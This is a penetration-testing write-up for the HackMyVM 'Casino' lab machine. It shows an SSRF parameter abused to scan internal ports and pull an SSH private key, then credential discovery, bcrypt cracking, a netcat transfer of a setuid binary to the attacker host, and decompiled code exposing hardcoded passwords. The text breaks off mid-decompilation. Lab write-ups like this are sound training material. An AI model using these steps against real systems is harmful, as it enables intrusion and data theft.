# CTF Penetration Testing

## HackMyVM

### Casino - Machine

#### Machine Description

- Machine name: [Casino](https://hackmyvm.eu/machines/machine.php?vm=Casino)
- Machine type: Linux VM <img src="https://hackmyvm.eu/img/linux.png" alt="Linux" width="20"/>
- Machine difficulty: 🟨 Medium

<img src="https://hackmyvm.eu/img/vm/mez.png" alt="Casino Machine Logo" width="150"/>

#### Tools Used

- angr
- Burp Suite
- Cutter
- ffuf
- Gobuster
- lsof
- Netcat
- Nikto
- Nmap
- PwnTools
- ZAP

#### Machine Writeup

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`ifconfig`:
```
docker0: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        inet 172.17.0.1  netmask 255.255.0.0  broadcast 172.17.255.255
        ether 02:42:d5:98:e8:1c  txqueuelen 0  (Ethernet)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.0.2.15  netmask 255.255.255.0  broadcast 10.0.2.255
        ether 08:00:27:1e:36:4a  txqueuelen 1000  (Ethernet)
        RX packets 89846  bytes 133670439 (127.4 MiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10045  bytes 606477 (592.2 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

eth1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.119  netmask 255.255.255.0  broadcast 192.168.56.255 ←
        inet6 fe80::a50f:d743:435d:299a  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:9d:2e:ba  txqueuelen 1000  (Ethernet)
        RX packets 9  bytes 4816 (4.7 KiB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 29  bytes 4577 (4.4 KiB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 8  bytes 480 (480.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 8  bytes 480 (480.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

`fping -a -g 192.168.56.0/24 2> /dev/null`:
```
192.168.56.100
192.168.56.118
192.168.56.131 ←
```

`nmap -Pn -sSV -p- -T5 192.168.56.131`:
```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-02 05:47 EDT
Nmap scan report for 192.168.56.131
Host is up (0.00049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2 (protocol 2.0) ←
80/tcp open  http    Apache httpd 2.4.57 ((Debian)) ←
MAC Address: 08:00:27:0B:D8:91 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.31 seconds
```

`whatweb http://192.168.56.131 -v`:
```
WhatWeb report for http://192.168.56.131
Status    : 200 OK
Title     : Binary Bet Casino
IP        : 192.168.56.131
Country   : RESERVED, ZZ

Summary   : Apache[2.4.57], Cookies[PHPSESSID], HTTPServer[Debian Linux][Apache/2.4.57 (Debian)], PasswordField[password] ←

Detected Plugins:
[ Apache ]
        The Apache HTTP Server Project is an effort to develop and 
        maintain an open-source HTTP server for modern operating 
        systems including UNIX and Windows NT. The goal of this 
        project is to provide a secure, efficient and extensible 
        server that provides HTTP services in sync with the current 
        HTTP standards. 

        Version      : 2.4.57 (from HTTP Server Header)
        Google Dorks: (3)
        Website     : http://httpd.apache.org/

[ Cookies ]
        Display the names of cookies in the HTTP headers. The 
        values are not returned to save on space. 

        String       : PHPSESSID

[ HTTPServer ]
        HTTP server header string. This plugin also attempts to 
        identify the operating system from the server header. 

        OS           : Debian Linux
        String       : Apache/2.4.57 (Debian) (from server string)

[ PasswordField ]
        find password fields 

        String       : password (from field name)

HTTP Headers:
        HTTP/1.1 200 OK
        Date: Wed, 02 Oct 2024 09:55:26 GMT
        Server: Apache/2.4.57 (Debian)
        Set-Cookie: PHPSESSID=du8n6r913jr6b1hcvp250p4u0f; path=/
        Expires: Thu, 19 Nov 1981 08:52:00 GMT
        Cache-Control: no-store, no-cache, must-revalidate
        Pragma: no-cache
        Vary: Accept-Encoding
        Content-Encoding: gzip
        Content-Length: 484
        Connection: close
        Content-Type: text/html; charset=UTF-8
```

`nikto -h http://192.168.56.131`:
```
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          192.168.56.131
+ Target Hostname:    192.168.56.131
+ Target Port:        80
+ Start Time:         2024-10-04 04:17:49 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.57 (Debian)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ /: Cookie PHPSESSID created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /database.sql: Potentially interesting backup/cert file found. . See: https://cwe.mitre.org/data/definitions/530.html
+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.
+ /config.php: PHP Config file may contain database IDs and passwords. ←
+ /imgs/: Directory indexing found.
+ /imgs/: This might be interesting.
+ /database.sql: Database SQL found. ←
+ /styles/: Directory indexing found.
+ 8101 requests: 0 error(s) and 10 item(s) reported on remote host
+ End Time:           2024-10-04 04:19:01 (GMT-4) (72 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```

`curl http://192.168.56.131 -s`:
```html
<html>

<head>
  <meta charset="UTF-8" />
  <title>Binary Bet Casino</title>
  <!--By LordP4 <3 -->
  <link rel="stylesheet" href="styles/general.css" />
  <link rel="stylesheet" href="styles/main.css" />
</head>

<body>
  <div class="container">
    <main class="main">
      <div id="index_left">
        <h1>Binary Bet Casino</h1>
      </div>

      <div id="index_right">
        <form method="POST" action="index.php">
          <div class="input">
            <label for="username">User:</label> ←
            <br>
            <input type="text" name="username" id="username" />
          </div>
          <div class="input">
            <label for="password">Password:</label> ←
            <br>
            <input type="password" name="password" id="password" />
          </div>
          <input class="button" type="submit" value="Login" /> ←
          <a href="./register.php">I don't have an account</a>
                  </form>
      </div>
    </main>

    <footer class="footer">
      <p style="text-align: center">
        &copy; 2023 Binary Bet Casino. All rights reserved
      </p>
    </footer>
  </div>
</body>

</html>
```

`gobuster dir -u http://192.168.56.131 -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -b 400,401,404,500 -x html,php,bak,list,tmp,old,jpg,txt,zip -t 100`:
```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.131
[+] Method:                  GET
[+] Threads:                 100
[+] Wordlist:                /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt
[+] Negative Status codes:   400,401,404,500
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,list,txt,zip,html,php,tmp,old,jpg
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/register.php         (Status: 200) [Size: 1347] ←
/index.php            (Status: 200) [Size: 1138] ←
/.html                (Status: 403) [Size: 279]
/.php                 (Status: 403) [Size: 279]
/template.html        (Status: 200) [Size: 1170]
/imgs                 (Status: 301) [Size: 315] [--> http://192.168.56.131/imgs/]
/js                   (Status: 301) [Size: 313] [--> http://192.168.56.131/js/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/config.php           (Status: 200) [Size: 0]
/casino               (Status: 301) [Size: 317] [--> http://192.168.56.131/casino/]
/styles               (Status: 301) [Size: 317] [--> http://192.168.56.131/styles/]
/robots.txt           (Status: 200) [Size: 12]
/restricted.php       (Status: 302) [Size: 0] [--> ../index.php]
/.php                 (Status: 403) [Size: 279]
/.html                (Status: 403) [Size: 279]
/server-status        (Status: 403) [Size: 279]

[...]
```

`burpsuite`

`HTTP Request`:
```http
POST /index.php HTTP/1.1 ←
Host: 192.168.56.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded ←
Content-Length: 26
Origin: http://192.168.56.131
Connection: close
Referer: http://192.168.56.131/
Cookie: PHPSESSID=64goo3bm2ml7i35snr66kh7qns
Upgrade-Insecure-Requests: 1

username=TEST&password=TEST123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Wed, 02 Oct 2024 10:00:30 GMT
Server: Apache/2.4.57 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1186
Connection: close
Content-Type: text/html; charset=UTF-8


<html>

[...]
          <p class='error'>Error with user or password</p> ←

[...]

</html>
```

`HTTP Request`:
```http
POST /register.php HTTP/1.1 ←
Host: 192.168.56.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 33
Origin: http://192.168.56.131
Connection: close
Referer: http://192.168.56.131/register.php
Cookie: PHPSESSID=64goo3bm2ml7i35snr66kh7qns
Upgrade-Insecure-Requests: 1

username=TEST&password=TEST123 ←
```
`HTTP Response`:
```http
HTTP/1.1 302 Found ←
Date: Wed, 02 Oct 2024 09:58:38 GMT
Server: Apache/2.4.57 (Debian)
Location: index.php
Content-Length: 0
Connection: close
Content-Type: text/html; charset=UTF-8
```

`HTTP Request`:
```http
POST /index.php HTTP/1.1 ←
Host: 192.168.56.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded ←
Content-Length: 26
Origin: http://192.168.56.131
Connection: close
Referer: http://192.168.56.131/
Cookie: PHPSESSID=64goo3bm2ml7i35snr66kh7qns
Upgrade-Insecure-Requests: 1

username=TEST&password=TEST123 ←
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Wed, 02 Oct 2024 10:07:48 GMT
Server: Apache/2.4.57 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 2104
Connection: close
Content-Type: text/html; charset=UTF-8


<html>

[...]

        <div id="games">
            <div class="row">
                <div class="game" onclick="play_game(1)"><img src="../imgs/cup.png" alt="cups"></div>
                <div class="game" onclick="play_game(2)"><img src="../imgs/gun.png" alt="gun"></div>
                <div class="game" onclick="play_game(3)"><img src="../imgs/cross.png" alt="nope"></div>
                <div class="game" onclick="play_game(4)"><img src="../imgs/cross.png" alt="nope"></div>
            </div>

[...]

</html>
```

`zaproxy`

`Sites: http://192.168.56.131` > `<right-click>` > `Attack` > `Spider...` > `Starting Point: http://192.168.56.131`, `Recurse: enabled`, `Show Advanced Options: enabled` > `Start Scan` > `Export` > `./spider.csv`

`cat ./spider.csv`:
```
Processed,Method,URI,Flags
true,GET,http://192.168.56.131,Seed
true,GET,http://192.168.56.131/robots.txt,Seed
true,GET,http://192.168.56.131/sitemap.xml,Seed

[...]

true,GET,http://192.168.56.131/styles/?C=S;O=D,
true,GET,http://192.168.56.131/styles/?C=M;O=D,
true,GET,http://192.168.56.131/styles/?C=D;O=D,
```

`cat ./spider.csv | grep "true" | cut -d ',' -f 3 | grep -E '\?.*=' | tee ./spider_urls.list`:
```
http://192.168.56.131/casino/explainmepls.php?learnabout=en.wikipedia.org/wiki/Shell_game ←
http://192.168.56.131/casino/games/?C=N;O=D
http://192.168.56.131/casino/games/?C=M;O=A

[...]

http://192.168.56.131/js/?C=M;O=D
http://192.168.56.131/js/?C=D;O=D
http://192.168.56.131/js/?C=S;O=D
```

`burpsuite`

`HTTP Request`:
```http
GET /casino/explainmepls.php?learnabout=127.0.0.1:1234 HTTP/1.1 ←
Host: 192.168.56.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u ←
Upgrade-Insecure-Requests: 1
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Wed, 02 Oct 2024 12:31:19 GMT
Server: Apache/2.4.57 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1129 ←
Connection: close
Content-Type: text/html; charset=UTF-8


<html>

[...]

        <h1>LEARN HOW TO PLAY FIRST ;)</h1> ←

[...]

</html>
```

`seq 1 65535 | tee ./ports.list`:
```
1
2
3

[...]

65533
65534
65535
```

`ffuf -u "http://192.168.56.131/casino/explainmepls.php?learnabout=127.0.0.1:PORT" -w ./ports.list:PORT -H "Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u" -c -ic -t 100 -fs 1129`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.131/casino/explainmepls.php?learnabout=127.0.0.1:PORT ←
 :: Wordlist         : PORT: /home/kali/ports.list
 :: Header           : Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1129
________________________________________________

80                      [Status: 200, Size: 2267, Words: 576, Lines: 98, Duration: 4023ms]
6969                    [Status: 200, Size: 1968, Words: 499, Lines: 81, Duration: 180ms] ←

[...]
```

`burpsuite`

`HTTP Request`:
```http
GET /casino/explainmepls.php?learnabout=127.0.0.1:6969 HTTP/1.1 ←
Host: 192.168.56.131
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u
Upgrade-Insecure-Requests: 1
```
`HTTP Response`:
```http
HTTP/1.1 200 OK ←
Date: Wed, 02 Oct 2024 12:43:57 GMT
Server: Apache/2.4.57 (Debian)
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Vary: Accept-Encoding
Content-Length: 1968
Connection: close
Content-Type: text/html; charset=UTF-8


<html>

[...]

<body>
    <h1>Casino admins To-Do List</h1>

    <div>
        <ul>
            <li>Add more games</li>
            <li>Don't forget the password for the binary</li>
            <li>Buy a domain</li>
            <li>Make games harder</li>
            <li>Secure FTP server</li>
            <li>Hack into the FBI</li>
            <li>Buy a sandwich for Wednesday</li>
            <li>Learn about symbolic execution</li>
            <li>Develop WannaCry 4.0</li>
            <li>Help the Colors hacker group to restore their server and make it more secure.</li>
        </ul>
    </div>
</body>

</html>
```

`ffuf -u "http://192.168.56.131/casino/explainmepls.php?learnabout=127.0.0.1:6969/DIRECTORY" -w /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt:DIRECTORY -H "Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u" -e .php,.txt,.html -c -ic -t 100 -fs 1129`:
```
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://192.168.56.131/casino/explainmepls.php?learnabout=127.0.0.1:6969/DIRECTORY ←
 :: Wordlist         : DIRECTORY: /usr/share/wordlists/seclists/SecLists-master/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Header           : Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u
 :: Extensions       : .php .txt .html 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 100
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 1129
________________________________________________

codebreakers            [Status: 200, Size: 1406, Words: 317, Lines: 65, Duration: 315ms] ←

[...]
```

`curl "http://192.168.56.131/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers" -H "Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u" -s`:
```html
<html>

<div>
    <button class="head_buttom" onclick="menu()">Games</button>
</div>
<div>
    <h2>Welcome TEST</h1>
        <div>
            <p>Current money: 0$</p>
        </div>
</div>
<div>
    <button class="head_buttom" onclick="logout()">Log out</button>
</div>        </main>

        <h1>LEARN HOW TO PLAY FIRST ;)</h1>

        <div id="games">
            <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    Pls Shimmer, dont f*ck this up again... ←
    <a href="./shimmer_rsa"></a> ←
</body>
</html>        </div>

        <footer class="footer">
            <p style="text-align: center">
                &copy; 2023 Binary Bet Casino. All rights reserved
            </p>
        </footer>
    </div>
</body>

</html>
```

`curl "http://192.168.56.131/casino/explainmepls.php?learnabout=127.0.0.1:6969/codebreakers/shimmer_rsa" -H "Cookie: PHPSESSID=f7rsuifoforhvkufgqdrmrao2u" -s`:
```html
<html>

[...]

-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAyazv9re1BpLFcPmH6jKbg7kjTItNYfNlRBtfpS93ahPdrBOHJwYJ
g+WHAeh2lxWsrjTlvYB7gHgr2CDw8XZ3to5E2lx06ufaH3URZ1WxYnUONrgJQqCzeNniP/

[...]

740tTnigXXcYVq4pk9HhHVxBEb0sK/EaGcycH6rnWa+B1EkZZDE1qpeYutQaC+77b86MRB
olLBfy03QWwkulBGaHUhUbjyF1sy1w+5W0I6Fy11rj8AtQCWlWEeJ5IeOubgPB134lmXSE
5JYqg0CzdThLWdAAAADnNoaW1tZXJAY2FzaW5vAQIDBA==
-----END OPENSSH PRIVATE KEY-----

[...]

</html>
```

`vim ./shimmer_rsa`:
```
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAyazv9re1BpLFcPmH6jKbg7kjTItNYfNlRBtfpS93ahPdrBOHJwYJ
g+WHAeh2lxWsrjTlvYB7gHgr2CDw8XZ3to5E2lx06ufaH3URZ1WxYnUONrgJQqCzeNniP/

[...]

740tTnigXXcYVq4pk9HhHVxBEb0sK/EaGcycH6rnWa+B1EkZZDE1qpeYutQaC+77b86MRB
olLBfy03QWwkulBGaHUhUbjyF1sy1w+5W0I6Fy11rj8AtQCWlWEeJ5IeOubgPB134lmXSE
5JYqg0CzdThLWdAAAADnNoaW1tZXJAY2FzaW5vAQIDBA==
-----END OPENSSH PRIVATE KEY-----
```

`chmod 600 ./shimmer_rsa`

`ssh -i ./shimmer_rsa shimmer@192.168.56.131`:
```
Debian GNU/Linux 12
Welcome to Binary Bet Casino
--------------------------------
Linux casino 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Oct  2 15:26:14 2024 from 192.168.56.118
```

![Victim: shimmer](https://img.shields.io/badge/Victim-shimmer-64b5f6?logo=linux&logoColor=white)

`whoami`:
```
shimmer ←
```

`id`:
```
uid=1001(shimmer) gid=1001(shimmer) grupos=1001(shimmer),100(users)
```

`uname -a`:
```
Linux casino 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
```

`lsb_release -a`:
```
No LSB modules are available.
Distributor ID: Debian
Description:    Debian GNU/Linux 12 (bookworm)
Release:        12
Codename:       bookworm
```

`cd /home/shimmer`

`ls -alps ./`:
```
total 48
 4 drwx------ 3 shimmer shimmer  4096 jun 14  2023 ./
 4 drwxr-xr-x 4 root    root     4096 jun 14  2023 ../
 0 lrwxrwxrwx 1 shimmer shimmer     9 jun 14  2023 .bash_history -> /dev/null
 4 -rw-r--r-- 1 shimmer shimmer   220 jun 14  2023 .bash_logout
 4 -rw-r--r-- 1 shimmer shimmer  3526 jun 14  2023 .bashrc
20 -rwsr-xr-x 1 root    root    16432 jun 14  2023 pass ←
 4 -rw-r--r-- 1 shimmer shimmer   807 jun 14  2023 .profile
 4 drwx------ 2 shimmer shimmer  4096 jun 14  2023 .ssh/
 4 -rw-r--r-- 1 root    root       17 jun 14  2023 user.txt ←
```

`cat ./user.txt `:
```
casinousergobrrr ←
```

`ls -alps /var/www/html`:
```
total 56
4 drwxr-xr-x 6 www-data www-data 4096 jun 14  2023 ./
4 drwxr-xr-x 3 root     root     4096 jun 13  2023 ../
4 drwxr-xr-x 3 www-data www-data 4096 jun 16  2023 casino/
4 -rwxr-xr-x 1 www-data www-data  362 jun  9  2023 config.php
4 -rwxr-xr-x 1 www-data www-data  363 jun  9  2023 database.sql ←
4 drwxr-xr-x 2 www-data www-data 4096 jun 14  2023 imgs/
4 -rwxr-xr-x 1 www-data www-data 2064 jun 11  2023 index.php
4 drwxr-xr-x 2 www-data www-data 4096 jun 14  2023 js/
4 -rwxr-xr-x 1 www-data www-data  323 jun 10  2023 logout.php
4 -rwxr-xr-x 1 www-data www-data 2487 jun 11  2023 register.php
4 -rwxr-xr-x 1 www-data www-data  114 jun  9  2023 restricted.php
4 -rwxr-xr-x 1 www-data www-data   12 jun 13  2023 robots.txt
4 drwxr-xr-x 2 www-data www-data 4096 jun 14  2023 styles/
4 -rwxr-xr-x 1 www-data www-data 1170 jun  9  2023 template.html
```

<❌ Failed Step.>
`cat /var/www/html/database.sql`:
```sql
CREATE USER 'casino_admin'@'localhost' IDENTIFIED BY 'IJustWantToBeRichBaby420'; ←
CREATE DATABASE IF NOT EXISTS casino;
GRANT ALL PRIVILEGES ON casino.* TO 'casino_admin'@'localhost';
FLUSH PRIVILEGES;

USE casino;
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  user VARCHAR(50) NOT NULL,
  pass VARCHAR(255) NOT NULL,
  money INT UNSIGNED NOT NULL
);
```

`ss -tunlp`:
```
Netid              State               Recv-Q              Send-Q                           Local Address:Port                           Peer Address:Port              Process              
udp                UNCONN              0                   0                                      0.0.0.0:68                                  0.0.0.0:*                                      
tcp                LISTEN              0                   80                                   127.0.0.1:3306 ←                              0.0.0.0:*                                      
tcp                LISTEN              0                   128                                    0.0.0.0:22                                  0.0.0.0:*                                      
tcp                LISTEN              0                   511                                  127.0.0.1:6969                                0.0.0.0:*                                      
tcp                LISTEN              0                   511                                          *:80                                        *:*                                      
tcp                LISTEN              0                   128                                       [::]:22                                     [::]:* 
```

`mysql -u casino_admin -pIJustWantToBeRichBaby420`:
```
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 293083
Server version: 10.11.3-MariaDB-1 Debian 12

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```
```
MariaDB [(none)]> SHOW DATABASES; ←
+--------------------+
| Database           |
+--------------------+
| casino             | ←
| information_schema |
+--------------------+
2 rows in set (0,001 sec)

MariaDB [(none)]> USE casino; ←
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```
```
MariaDB [casino]> SHOW TABLES; ←
+------------------+
| Tables_in_casino |
+------------------+
| users            | ←
+------------------+
1 row in set (0,000 sec)

MariaDB [casino]> SELECT * FROM users; ←
+----+---------+--------------------------------------------------------------+-------+
| id | user    | pass                                                         | money |
+----+---------+--------------------------------------------------------------+-------+
|  1 | test    | $2y$10$4tky6gGa5ocxG6lDf6MOCef9iyl5iWb4kL2tT2K7Y9a88nJAEFkrO |     0 |
|  2 | ZAP     | $2y$10$3qPsSSin2ZmE6ge39qIVF.OSW5zviPfjC75dmFKpsFGDZqyCmjlVW |  1000 |
|  3 | TIEO    | $2y$10$lfC6xLV9jUJeSxytKsGnpuBR5EefkmlKLyj1voXOaKWBQpOx/gLGm |  1000 | ←
+----+---------+--------------------------------------------------------------+-------+
3 rows in set (0,001 sec)

MariaDB [casino]> exit
Bye
```

`echo '$2y$10$lfC6xLV9jUJeSxytKsGnpuBR5EefkmlKLyj1voXOaKWBQpOx/gLGm' > ./hash.txt`

`john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt ./hash.txt`:
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status

[...]
```
</❌ Failed Step.>

`ls -l ./pass`:
```
-rwsr-xr-x 1 root root 16432 jun 14  2023 ./pass ←
```

`./pass`:
```
Passwd: TEST ←
Incorrect pass
```

`file ./pass`:
```
pass: setuid ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=69534d98e628cad52c35ba899c71650dc0e48bdf, for GNU/Linux 3.2.0, not stripped ←
```

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

`nc -lnvp 4444 > ./pass`:
```
listening on [any] 4444 ... ←
```

![Victim: shimmer](https://img.shields.io/badge/Victim-shimmer-64b5f6?logo=linux&logoColor=white)

`cat ./pass | nc 192.168.56.118 4444 -q 0`

![Attacker](https://custom-icon-badges.demolab.com/badge/Attacker-e57373?logo=kali-linux_white_32&logoColor=white)

```
connect to [192.168.56.118] from (UNKNOWN) [192.168.56.131] 56656 ←
```

`ls -l ./pass`:
```
-rw-rw-r-- 1 kali kali 16432 Oct  2 10:19 ./pass
```

`cutter ./pass`

`Decompiler (main)`:
```c
undefined8 main(int argc, char **argv)
{
    int32_t iVar1;
    undefined4 uVar2;
    int64_t iVar3;
    char **var_108h;
    int var_fch;
    char *s1;
    int64_t var_88h;
    int64_t var_80h;
    char *s;
    int var_ch;
    
    var_fch = argc;
    printf("Passwd: "); ←
    fgets(&s, 100, _stdin); ←
    iVar3 = strlen(&s);
    if (*(char *)((int64_t)&var_80h + iVar3 + 7) == '\n') {
        iVar3 = strlen(&s);
        *(undefined *)((int64_t)&var_80h + iVar3 + 7) = 0;
    }
    iVar1 = checkPasswd((char *)&s); ←
    if (iVar1 == 1) { ←
        var_ch = open("/opt/root.pass", 0); ←
        uVar2 = getuid(); ←
        setuid(uVar2); ←
        printf("Second Passwd: "); ←
        fgets(&s1, 100, _stdin); ←
        iVar3 = strlen(&s1);
        if (*(char *)((int64_t)&var_fch + iVar3 + 3) == '\n') {
            iVar3 = strlen(&s1);
            *(undefined *)((int64_t)&var_fch + iVar3 + 3) = 0;
        }
        iVar1 = strcmp(&s1, "ultrasecretpassword"); ←
        if (iVar1 == 0) { ←
            var_88h = (int64_t)data.0000205c;
            var_80h = 0;
            execvp("/bin/sh", &var_88h); ←
        } else {
            puts("bye.");
        }
    }
    return 0;
}
```

`Decompiler (sym.CheckPasswd)`:
```c
undefined8 checkPasswd(char *arg1)
{
    int64_t iVar1;
    undefined8 uVar2;
    char *s;
    
    iVar1 = strlen(arg1);
    if (iVar1 == 0x1a) {
        if ((int32_t)*arg1 - (int32_t)arg1[0x14] == -10) {
